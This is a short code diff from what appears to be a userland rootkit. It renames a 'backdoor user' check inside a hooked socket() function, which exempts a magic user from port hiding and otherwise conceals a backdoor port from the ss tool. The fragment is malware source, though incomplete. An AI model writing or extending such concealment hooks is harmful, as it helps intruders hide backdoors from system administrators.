@@ -9,7 +9,7 @@ int ssme(int domain, int protocol){
 }
 
 int socket(int domain, int type, int protocol){
-    if(is_bdusr()) goto o_socket;
+    if(magicusr()) goto o_socket;
 
     if(ssme(domain, protocol)){
         if(!hideport_alive())  /* don't break ss if there's no need to */
